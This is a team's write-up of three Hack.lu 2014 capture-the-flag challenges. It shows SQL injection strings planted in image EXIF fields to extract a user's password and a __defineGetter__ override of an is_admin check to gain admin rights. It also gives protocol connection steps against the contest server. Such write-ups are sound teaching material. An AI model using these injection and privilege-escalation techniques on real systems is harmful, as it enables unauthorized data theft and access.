<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8" />
<meta name="generator" content="AsciiDoc 8.6.8" />
<title>Hack.lu 2014 Hacking Contest Write-Up</title>
<link href='http://afnom.net/css/wiki.css' rel='stylesheet' type='text/css'>

<script src="http://afnom.net/js/wiki.js">
</script>
</head>
<body class="article">
<div id="header">
<h1>Hack.lu 2014 Hacking Contest Write-Up</h1>
<span id="author">Michael Denzel</span><br />
<span id="email"><code>&lt;<a href="mailto:m.denzel@cs.bham.ac.uk">m.denzel@cs.bham.ac.uk</a>&gt;</code></span><br />
<span id="revnumber">version 1.0,</span>
<span id="revdate">2014-10-23</span>
<div id="toc">
  <div id="toctitle">Table of Contents</div>
  <noscript><p><b>JavaScript must be enabled in your browser to display the table of contents.</b></p></noscript>
</div>
</div>
<div id="content">
<div class="sect1">
<h2 id="_challenge_9_imageupload_web">1. Challenge 9 - "ImageUpload" (Web)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_description">1.1. Description</h3>
<div class="paragraph"><p>In the Wild Wild Web, there are really bad guys. The sheriff doesn&#8217;t know them all. Therefore, he needs your help.
Upload pictures of criminals to this site and help the sheriff to arrest them.
You can make this Wild Wild Web much less wild!!!</p></div>
<div class="paragraph"><p>Pictures will be deleted on regular basis!</p></div>
<hr />
</div>
<div class="sect2">
<h3 id="_solution">1.2. Solution</h3>
<div class="paragraph"><p>ImageUpload was a web based challenge. The website consisted of a Login page and an upload
section which accepted pictures (jpg/jpeg). After uploading a picture some
meta-information of the exif-header of images were displayed (height, width, author,
manufacturer, model).</p></div>
<div class="imageblock" id="imageupload_pic" style="text-align:center;">
<div class="content">
<img src="./imageupload.png" alt="./imageupload.png" width="60%" />
</div>
<div class="title">Figure 1. ImageUpload Website</div>
</div>
<div class="paragraph"><p>After unsuccessfully uploading a php shell (as shell.jpg), we focused on the exif data.</p></div>
<div class="paragraph"><p>There is a tool in Linux to modify this data:</p></div>
<div class="listingblock">
<div class="title">shell-code</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>exiftool -<span style="color: #990000">&lt;</span>EXIF-FIELD<span style="color: #990000">&gt;=&lt;</span>DATA<span style="color: #990000">&gt;</span> picture<span style="color: #990000">.</span>jpg</tt></pre></div></div>
<div class="paragraph"><p>Our first guesses were PHP and JavaScript since the data gets displayed on the website (see
<a href="#imageupload_pic">[imageupload_pic]</a> below the picture).</p></div>
<div class="paragraph"><p>But neither PHP nor JavaScript worked.</p></div>
<div class="paragraph"><p>We then realised that the website shows an error message, when putting an apostrophe <code>'</code>
into the exif data. This means the website is vulnerable to SQL injection attacks.</p></div>
<div class="paragraph"><p>Unfortunately, it turned out that the chosen exif field was integers-only (other fields were not
displayed correctly) and we had to deal with outputting numbers only.</p></div>
<div class="paragraph"><p>For the database we guessed the layout as a table "users" with columns "password" and "name".</p></div>
<div class="paragraph"><p>To prove it, we counted the password column in table users:</p></div>
<div class="listingblock">
<div class="title">SQL injection</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>exiftool -model<span style="color: #990000">=</span><span style="color: #FF0000">"' + (SELECT COUNT(password) FROM users) + '"</span> logo<span style="color: #990000">.</span>jpeg</tt></pre></div></div>
<div class="paragraph"><p>The resulting output "2" showed us that
- table users exists
- column password exists
- there are two users</p></div>
<div class="paragraph"><p>We further guessed one user as "sheriff" at the Login page and confirmed that column "name"
exists, too.</p></div>
<div class="paragraph"><p>To output the sheriff&#8217;s password in numbers we iterated over the password and printed the ascii
representation of the character. E.g. for the first character in ascii we queried the following:</p></div>
<div class="listingblock">
<div class="title">final attack string</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>exiftool -model<span style="color: #990000">=</span><span style="color: #FF0000">"' + (SELECT ASCII(SUBSTR(password, 0, 1)) FROM users WHERE name = 'sheriff') + '"</span> logo<span style="color: #990000">.</span>jpeg</tt></pre></div></div>
<div class="paragraph"><p>We retrieved the sheriff&#8217;s password as "AO7eikkOCucCFJOyyaaQ" and were able to login to retrieve
the flag <code>flag{1_5h07_7h3_5h3r1ff}</code> for 200+70 points.</p></div>
<div class="paragraph"><p>(joint work Andreea, Joe, Mike)</p></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenge_11_objection_web">2. Challenge 11 - "Objection" (Web)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_description_2">2.1. Description</h3>
<div class="paragraph"><p>This guard talks a weird dialect. And why does he talk in such a complicated way? <a href="./objection_4966674d17ff296939c0e3dfccfe87ed.co">Download</a></p></div>
<div class="paragraph"><p>nc wildwildweb.fluxfingers.net 1408</p></div>
<hr />
</div>
<div class="sect2">
<h3 id="_solution_2">2.2. Solution</h3>
<div class="paragraph"><p>We were able to translate the code into JavaScript using LiveScript: <a href="./objection.js">objection.js</a></p></div>
<div class="paragraph"><p>When looking at the code, the following line is vulnerable.</p></div>
<div class="listingblock">
<div class="title">vulnerable line in JavaScript</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(</span><span style="font-weight: bold"><span style="color: #0000FF">typeof</span></span> client_context<span style="color: #990000">[</span>funcname<span style="color: #990000">]</span> <span style="color: #990000">!==</span> <span style="color: #FF0000">'function'</span><span style="color: #990000">)</span> <span style="color: #FF0000">{</span>
        <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> con<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">write</span></span><span style="color: #990000">(</span><span style="color: #FF0000">"error: unknown function "</span> <span style="color: #990000">+</span> funcname <span style="color: #990000">+</span> <span style="color: #FF0000">"</span><span style="color: #CC33CC">\n</span><span style="color: #FF0000">"</span><span style="color: #990000">);</span>
<span style="color: #FF0000">}</span></tt></pre></div></div>
<div class="paragraph"><p>It only checks if the function <code>funcname</code> exists. But this also includes inherited functions
of the object <code>client_context</code> like e. g. <code>toString()</code>.</p></div>
<div class="paragraph"><p>We, therefore, tried to redefine functions using <code>eval()</code>, lamdba-functions, <code>__defineSetter__</code>
and succeeded with <code>__defineGetter__</code>.</p></div>
<div class="paragraph"><p><code>__defineGetter__(name, function)</code> overwrites a label with a function and makes it into a getter.
The resulting "function" can be used as a normal variable:</p></div>
<div class="listingblock">
<div class="title">example code</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">var</span></span> finite <span style="color: #990000">=</span> <span style="color: #FF0000">{}</span>
finite<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">__defineGetter__</span></span><span style="color: #990000">(</span><span style="color: #FF0000">"monkeys"</span><span style="color: #990000">,</span> <span style="font-weight: bold"><span style="color: #0000FF">function</span></span><span style="color: #990000">()</span><span style="color: #FF0000">{</span><span style="font-weight: bold"><span style="color: #0000FF">return</span></span> <span style="color: #FF0000">"monkeys rock!"</span><span style="color: #990000">;</span><span style="color: #FF0000">}</span>
console<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">log</span></span><span style="color: #990000">(</span>finite<span style="color: #990000">.</span>monkeys<span style="color: #990000">)</span> <span style="font-style: italic"><span style="color: #9A1900">//notice the missing brackets - not: finite.monkeys()</span></span>
<span style="font-style: italic"><span style="color: #9A1900">//prints "monkeys rock!" to the console</span></span></tt></pre></div></div>
<div class="paragraph"><p>The only problem is that we do not control the second parameter. The function is
given in the code:</p></div>
<div class="listingblock">
<div class="title">attacked part of the JavaScript code</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>client_context<span style="color: #990000">[</span>funcname<span style="color: #990000">](</span>args<span style="color: #990000">,</span> <span style="font-weight: bold"><span style="color: #0000FF">function</span></span><span style="color: #990000">(</span>it<span style="color: #990000">)</span><span style="color: #FF0000">{</span>
        <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> con<span style="color: #990000">.</span><span style="font-weight: bold"><span style="color: #000000">write</span></span><span style="color: #990000">(</span>it <span style="color: #990000">+</span> <span style="color: #FF0000">"</span><span style="color: #CC33CC">\n</span><span style="color: #FF0000">"</span><span style="color: #990000">);</span>
<span style="color: #FF0000">}</span><span style="color: #990000">);</span></tt></pre></div></div>
<div class="paragraph"><p>But, since it usually succeeds to write to the connection, it returns true!</p></div>
<div class="paragraph"><p>So we used <code>__defineGetter__</code> to overwrite the variable <code>is_admin</code> in order to gain admin
privileges.</p></div>
<div class="listingblock">
<div class="title">attack</div>
<div class="content">
<pre><code>hello!
__defineGetter__ is_admin
get_token
undefined
The current token is flag{real_cowboys_dont_use_object_create_null}</code></pre>
</div></div>
<div class="paragraph"><p><code>__defineGetter__ is_admin</code> overwrites the variable <code>is_admin</code> with a getter which uses the
next argument - here: <code>function(it){return con.write(it + "\n");}</code> - and always returns true.</p></div>
<div class="paragraph"><p>The flag was afterwards retrieved for 150+80 points using <code>get_token</code>.</p></div>
<div class="paragraph"><p>(joint work Chris, Mike)</p></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenge_31_wanted_translator_misc">3. Challenge 31 - "Wanted: Translator" (Misc)</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_description_3">3.1. Description</h3>
<div class="paragraph"><p>We are in desperate need of a translator who understands the languages of varoius Indian tribes. We already know how to speak to the Apache tribe via HTTP but we have some stuff missing. We offer 5$ per successfully translated language.</p></div>
<div class="paragraph"><p>(That means you can send us 7 solutions to this challenge and will receive 5 points for each.)</p></div>
<div class="literalblock">
<div class="content">
<pre><code>SMTP
GOPHER
POP3
FINGER
TFTP
IRC
NNTP</code></pre>
</div></div>
<hr />
</div>
<div class="sect2">
<h3 id="_solution_3">3.2. Solution</h3>
<div class="paragraph"><p>We realised that there was a tftp server running since it was possible to connect with the
following command.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>tftp wildwildweb<span style="color: #990000">.</span>fluxfingers<span style="color: #990000">.</span>net</tt></pre></div></div>
<div class="paragraph"><p>Afterwards we used the default ports and programs to connect to the other protocols:</p></div>
<div class="sect3">
<h4 id="_smtp">3.2.1. SMTP</h4>
<div class="ulist"><ul>
<li>
<p>
connect to port 25 with telnet
</p>
</li>
<li>
<p>
send mail to <code>fluxfingers@rub.de</code>
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_gopher">3.2.2. GOPHER</h4>
<div class="ulist"><ul>
<li>
<p>
connection: <code>telnet wildwildweb.fluxfingers.net gopher</code>
</p>
</li>
<li>
<p>
send <code>\r\n</code>
</p>
</li>
<li>
<p>
reconnect
</p>
</li>
<li>
<p>
send <code>0\r\n</code>
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_pop3">3.2.3. POP3</h4>
<div class="ulist"><ul>
<li>
<p>
<code>USER flux</code>
</p>
</li>
<li>
<p>
<code>PASS flux</code>
</p>
</li>
<li>
<p>
<code>LIST</code>
</p>
</li>
<li>
<p>
<code>RETR 1</code>
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_finger">3.2.4. FINGER</h4>
<div class="ulist"><ul>
<li>
<p>
connected to port 79 using telnet
</p>
</li>
<li>
<p>
send <code>\r\n</code> to get user list
</p>
</li>
<li>
<p>
reconnect
</p>
</li>
<li>
<p>
send <code>r00t\r\n</code> to get details for the user r00t
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_tftp">3.2.5. TFTP</h4>
<div class="paragraph"><p>The port was open but TFTP does not support a list command, so we wrote a script.
Guessing the name of the file is another solution.</p></div>
<div class="listingblock">
<div class="title">perl script</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>perl <span style="color: #990000">-</span>MNet<span style="color: #990000">::</span>TFTP <span style="color: #990000">-</span>e <span style="color: #FF0000">'$tftp = Net::TFTP-&gt;new("wildwildweb.fluxfingers.net"); $tftp-&gt;get("flag", \*STDOUT);'</span></tt></pre></div></div>
<div class="listingblock">
<div class="title">connection with tftp</div>
<div class="content"><!-- Generator: GNU source-highlight 3.1.6
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>tftp wildwildweb<span style="color: #990000">.</span>fluxfingers<span style="color: #990000">.</span>net
tftp<span style="color: #990000">&gt;</span> get flag</tt></pre></div></div>
<div class="paragraph"><p><a href="./tftp.txt">Here</a> is the file, including a bonus text adventure.</p></div>
</div>
<div class="sect3">
<h4 id="_irc">3.2.6. IRC</h4>
<div class="ulist"><ul>
<li>
<p>
connected to port 6667
</p>
</li>
<li>
<p>
listed the channels with /list
</p>
</li>
<li>
<p>
joined channel #flagchannel
</p>
</li>
<li>
<p>
send a private message to flagbot.
</p>
</li>
</ul></div>
</div>
<div class="sect3">
<h4 id="_nntp">3.2.7. NNTP</h4>
<div class="ulist"><ul>
<li>
<p>
connection: <code>telnet wildwildweb.fluxfingers.net nntp</code>
</p>
</li>
<li>
<p>
<code>GROUP apache.chitchat</code>
</p>
</li>
<li>
<p>
<code>NEXT</code>
</p>
</li>
<li>
<p>
<code>ARTICLE</code>
</p>
</li>
</ul></div>
<div class="paragraph"><p>5 points per challenge makes 35 points in total.</p></div>
<div class="paragraph"><p>(joint work Chris, Joe, Mike, Sam)</p></div>
</div>
</div>
</div>
</div>
</div>
<div id="footnotes"><hr /></div>
<div id="footer">
<div id="footer-text">
Version 1.0<br />
Last updated 2014-10-23 18:59:23 BST
</div>
</div>
</body>
</html>
